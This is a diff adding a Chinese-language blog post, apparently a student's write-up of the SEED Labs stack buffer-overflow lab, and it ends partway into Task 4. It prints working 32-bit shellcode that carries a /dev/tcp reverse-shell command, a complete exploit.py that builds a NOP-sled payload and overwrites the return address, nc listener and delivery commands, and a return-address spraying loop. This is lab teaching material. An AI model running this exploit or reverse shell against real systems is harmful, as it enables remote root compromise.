@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="SEED-Labs 缓冲区溢出Task1 魔改shellcode就是把 1&#x2F;bin&#x2F;ls -l; echo Hello 32; &#x2F;bin&#x2F;tail -n 2 &#x2F;etc&#x2F;passwd     *  改成带有删除的，如删除tmpfile。 1&#x2F;bin&#x2F;rm -f tmpfile; echo Hello 32;                        *  然后试一下就行了，新建tmpfile，然">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN第一步_seedlabs_stack">
+<meta property="og:url" content="http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E6%AD%A5-seedlabs-stack/index.html">
+<meta property="og:site_name" content="ShuiChang厕纸博客站">
+<meta property="og:description" content="SEED-Labs 缓冲区溢出Task1 魔改shellcode就是把 1&#x2F;bin&#x2F;ls -l; echo Hello 32; &#x2F;bin&#x2F;tail -n 2 &#x2F;etc&#x2F;passwd     *  改成带有删除的，如删除tmpfile。 1&#x2F;bin&#x2F;rm -f tmpfile; echo Hello 32;                        *  然后试一下就行了，新建tmpfile，然">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/image/%E7%AC%AC%E4%B8%80%E6%AD%A5_seedlabs_stack/1697184523940.png">
+<meta property="og:image" content="http://example.com/image/%E7%AC%AC%E4%B8%80%E6%AD%A5_seedlabs_stack/1697187456135.png">
+<meta property="article:published_time" content="2023-11-05T15:19:41.000Z">
+<meta property="article:modified_time" content="2023-11-05T15:20:30.897Z">
+<meta property="article:author" content="ShuiChang">
+<meta property="article:tag" content="也许是PWN学习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/image/%E7%AC%AC%E4%B8%80%E6%AD%A5_seedlabs_stack/1697184523940.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>PWN第一步_seedlabs_stack</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E7%82%B9%E4%BA%8C%E6%AD%A5-seedlabs-shellcode/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/10/03/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E7%88%86%E7%A0%B4/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E6%AD%A5-seedlabs-stack/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E6%AD%A5-seedlabs-stack/&text=PWN第一步_seedlabs_stack"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E6%AD%A5-seedlabs-stack/&title=PWN第一步_seedlabs_stack"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E6%AD%A5-seedlabs-stack/&is_video=false&description=PWN第一步_seedlabs_stack"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PWN第一步_seedlabs_stack&body=Check out this article: http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E6%AD%A5-seedlabs-stack/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E6%AD%A5-seedlabs-stack/&title=PWN第一步_seedlabs_stack"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E6%AD%A5-seedlabs-stack/&title=PWN第一步_seedlabs_stack"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E6%AD%A5-seedlabs-stack/&title=PWN第一步_seedlabs_stack"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E6%AD%A5-seedlabs-stack/&title=PWN第一步_seedlabs_stack"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E6%AD%A5-seedlabs-stack/&name=PWN第一步_seedlabs_stack&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E6%AD%A5-seedlabs-stack/&t=PWN第一步_seedlabs_stack"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SEED-Labs-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="toc-number">1.</span> <span class="toc-text">SEED-Labs 缓冲区溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Task1-%E9%AD%94%E6%94%B9shellcode"><span class="toc-number">1.1.</span> <span class="toc-text">Task1 魔改shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task2-%E5%B9%B2%E6%8E%89%E7%AC%AC%E4%B8%80%E5%8F%B0%E6%9C%BA%E5%AD%90"><span class="toc-number">1.2.</span> <span class="toc-text">Task2 干掉第一台机子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task3-%E5%B9%B2%E6%8E%89%E7%AC%AC%E4%BA%8C%E5%8F%B0%E6%9C%BA%E5%AD%90"><span class="toc-number">1.3.</span> <span class="toc-text">Task3 干掉第二台机子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task4-%E5%B9%B2%E6%8E%89%E7%AC%AC%E4%B8%89%E5%8F%B0%E6%9C%BA%E5%AD%90"><span class="toc-number">1.4.</span> <span class="toc-text">Task4 干掉第三台机子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task5-%E5%B9%B2%E6%8E%89%E7%AC%AC%E5%9B%9B%E5%8F%B0%E6%9C%BA%E5%AD%90"><span class="toc-number">1.5.</span> <span class="toc-text">Task5 干掉第四台机子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task6-%E5%B9%B2%E6%8E%89%E5%9C%B0%E5%9D%80%E9%9A%8F%E6%9C%BA%E5%8C%96%E6%9C%BA%E5%AD%90"><span class="toc-number">1.6.</span> <span class="toc-text">Task6 干掉地址随机化机子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task7-%E5%B9%B2%E6%8E%89%E6%9C%89%E5%85%B6%E4%BB%96%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD%E7%9A%84%E6%9C%BA%E5%AD%90"><span class="toc-number">1.7.</span> <span class="toc-text">Task7 干掉有其他防御措施的机子</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#7-1-StackGuard-Protection"><span class="toc-number">1.7.1.</span> <span class="toc-text">7.1 StackGuard Protection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-1-Non-executable-Stack-Protection"><span class="toc-number">1.7.2.</span> <span class="toc-text">7.1 Non-executable Stack Protection</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        PWN第一步_seedlabs_stack
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ShuiChang</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-11-05T15:19:41.000Z" class="dt-published" itemprop="datePublished">2023-11-05</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E4%B9%9F%E8%AE%B8%E6%98%AFPWN%E5%AD%A6%E4%B9%A0/" rel="tag">也许是PWN学习</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="SEED-Labs-缓冲区溢出"><a href="#SEED-Labs-缓冲区溢出" class="headerlink" title="SEED-Labs 缓冲区溢出"></a>SEED-Labs 缓冲区溢出</h1><h2 id="Task1-魔改shellcode"><a href="#Task1-魔改shellcode" class="headerlink" title="Task1 魔改shellcode"></a>Task1 魔改shellcode</h2><p>就是把</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/ls -l; echo Hello 32; /bin/tail -n 2 /etc/passwd     *</span><br></pre></td></tr></table></figure>
+
+<p>改成带有删除的，如删除tmpfile。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/rm -f tmpfile; echo Hello 32;                        *</span><br></pre></td></tr></table></figure>
+
+<p>然后试一下就行了，新建tmpfile，然后删除。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch tmpfile</span><br><span class="line">./shellcode_32.py</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+
+<p>make是把两个file（shellcode32和shellcode64）都make。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -z execstack -o a32.out call_shellcode.c</span><br><span class="line">gcc -z execstack -o a64.out call_shellcode.c</span><br></pre></td></tr></table></figure>
+
+<p>然后直接开始运行出来的a32.out。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a32.out</span><br></pre></td></tr></table></figure>
+
+<p>发现文件删了，echo也echo了。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello 32</span><br></pre></td></tr></table></figure>
+
+<h2 id="Task2-干掉第一台机子"><a href="#Task2-干掉第一台机子" class="headerlink" title="Task2 干掉第一台机子"></a>Task2 干掉第一台机子</h2><p>首先把反制措施关了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /sbin/sysctl -w kernel.randomize_va_space=0</span><br></pre></td></tr></table></figure>
+
+<p>启动docker，nc发个东西过去看看</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo aminoac | nc 10.9.0.5 9090</span><br></pre></td></tr></table></figure>
+
+<p>返回了结果，显示8位内容。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">server-1-10.9.0.5 | Got a connection from 10.9.0.1</span><br><span class="line">server-1-10.9.0.5 | Starting stack</span><br><span class="line">server-1-10.9.0.5 | Input size: 8</span><br><span class="line">server-1-10.9.0.5 | Frame Pointer (ebp) inside bof():  0xffffd158</span><br><span class="line">server-1-10.9.0.5 | Buffer&#x27;s address inside bof():     0xffffd0e8</span><br><span class="line">server-1-10.9.0.5 | ==== Returned Properly ====</span><br></pre></td></tr></table></figure>
+
+<p>发现ebp指针在0xffffd158，Buffer’s address inside bof()为0xffffd0e8（buffer数组开始的地方）</p>
+<p>尝试把之前的shellcode用在其提供的程序骨架exploit.py上。然后改一下ret的地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">shellcode= (</span><br><span class="line">  <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># You can modify the following command string to run any command.</span></span><br><span class="line">   <span class="comment"># You can even run multiple commands. When you change the string,</span></span><br><span class="line">   <span class="comment"># make sure that the position of the * at the end doesn&#x27;t change.</span></span><br><span class="line">   <span class="comment"># The code above will change the byte at this position to zero,</span></span><br><span class="line">   <span class="comment"># so the command string ends here.</span></span><br><span class="line">   <span class="comment"># You can delete/add spaces, if needed, to keep the position the same. </span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         * </span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9999 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL   # Put the shellcode in here</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">517</span>-<span class="built_in">len</span>(shellcode)               <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0xffffd158</span> + <span class="number">8</span>    <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">0xffffd158</span> - <span class="number">0xffffd0e8</span> + <span class="number">4</span>              <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[offset:offset + <span class="number">4</span>] = (ret).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>) </span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>
+
+<p>其中，ret&#x3D;0xffffd158 + 8，（最小值为ebp + 8，最大值为ebp + 517 - len(code)）解释如下：</p>
+<p>首先，分配了517byte的空间。<br><em>为什么是517呢？因为在server的源代码中，stack.c的代码中为我们留了517大小个char的空间</em></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">517</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> length = fread(str, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="number">517</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input size: %d\n&quot;</span>, length);</span><br><span class="line">    dummy_function(str);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;==== Returned Properly ====\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后这个时候栈大概是这个样子<br><img src="/image/%E7%AC%AC%E4%B8%80%E6%AD%A5_seedlabs_stack/1697184523940.png" alt="1697184523940"></p>
+<p>由于shellcode的长度为136，大于112，所以不能把shellcode放到ebp-xxx的空间中，太大了塞不下。而这个ebp+xxx的空间，其地址为(ebp + 8, ebp + 517)，所以我们shellcode起始地址就得是(ebp + 8, ebp + 517 - len(code))。</p>
+<p>shellcode的长度可以简单地写个脚本来测试：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">shellcode= (</span><br><span class="line">  <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9999 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL   # Put the shellcode in here</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br></pre></td></tr></table></figure>
+
+<p>然后，将payload填满NOP。NOP的作用是让PC+1，换句话说就是空拍子。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br></pre></td></tr></table></figure>
+
+<p>然后，把shellcode放在这个巨大NOP段payload的某处。建议放在比ret高的那一段，不然放不下。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">0</span>               <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br></pre></td></tr></table></figure>
+<p>我们这里把shellcode放到尾部，即</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">start = <span class="number">517</span>-<span class="built_in">len</span>(shellcode)               <span class="comment"># Change this number</span></span><br><span class="line">content[start:] = shellcode </span><br></pre></td></tr></table></figure>
+
+
+<p>然后，定位这个ret，让返回地址变成我们shellcode的地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0xffffd158</span> + <span class="number">8</span>    <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">0xffffd158</span> - <span class="number">0xffffd0e8</span> + <span class="number">4</span>              <span class="comment"># Change this number </span></span><br></pre></td></tr></table></figure>
+
+<p><em>为什么是+8呢？因为我们要指到返回地址，其中差了两条指令</em></p>
+<p><em>为什么offset是ebp地址减去buffer地址加4？因为ebp地址减去buffer地址就是buffer长度，我们需要定位返回地址，就需要首先在517个长度大小的payload中填充满buffer大小的NOP，此时，再下一个填充的地址即为ebp所指的地址。我们再+4（再向前指一个），那么下一个填充的地址就是ret。</em><br><em>事实上，offset指payload中，和ret重合的位置，这里储存着跳转到shellcode的地址，这样函数在结束调用时，就会跳转到shellcode。</em></p>
+<p>然后，把ret地址塞到content里。这步代码是在payload中插入ret。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[offset:offset + <span class="number">4</span>] = (ret).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>) </span><br></pre></td></tr></table></figure>
+<p><img src="/image/%E7%AC%AC%E4%B8%80%E6%AD%A5_seedlabs_stack/1697187456135.png" alt="1697187456135"></p>
+<p>nc开启本地监听</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9999</span><br></pre></td></tr></table></figure>
+
+<p>直接运行python文件生成payload，然后用nc提交上去，然后本地监听就收到shell啦</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py</span><br><span class="line">cat badfile | nc 10.9.0.5 9090</span><br></pre></td></tr></table></figure>
+
+<p>whoami一下，居然是root权限，真实厉害。</p>
+<h2 id="Task3-干掉第二台机子"><a href="#Task3-干掉第二台机子" class="headerlink" title="Task3 干掉第二台机子"></a>Task3 干掉第二台机子</h2><p>netcat传点东西过去，发现只返回buffer地址了。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">server-2-10.9.0.6 | Got a connection from 10.9.0.1</span><br><span class="line">server-2-10.9.0.6 | Starting stack</span><br><span class="line">server-2-10.9.0.6 | Input size: 517</span><br><span class="line">server-2-10.9.0.6 | Buffer&#x27;s address inside bof():     0xffffd208</span><br></pre></td></tr></table></figure>
+
+<p>翻看实验手册发现buffer大小在[100,300]，而且不让用爆破（既把buffer大小全试一遍），那么就直接把所有的返回地址全部刷成shellcode地址，那它的返回无论是多少都能是shellcode（跳转地址覆盖了ebp和ebp+4）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ret    = <span class="number">0xffffd208</span> + <span class="number">308</span>     <span class="comment"># Change this number </span></span><br><span class="line"><span class="comment">#offset = 0xffffd208 - 0xffffd258 + 4              # Change this number </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">104</span>,<span class="number">308</span>,<span class="number">4</span>):</span><br><span class="line">  <span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">  content[offset:offset + <span class="number">4</span>] = (ret).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>) </span><br></pre></td></tr></table></figure>
+
+<p>因为buffer大小在100到300，那么ebp+4就位于104到308之间。可以直接把这块全换成跳转的地址。</p>
+<p>生成payload后发送到服务器，本地监听收到了shell。</p>
+<p>whoami一下，居然直接是root权限，真实厉害。</p>
+<h2 id="Task4-干掉第三台机子"><a href="#Task4-干掉第三台机子" class="headerlink" title="Task4 干掉第三台机子"></a>Task4 干掉第三台机子</h2><p>netcat传点东西过去，发现变成了64位。</p>
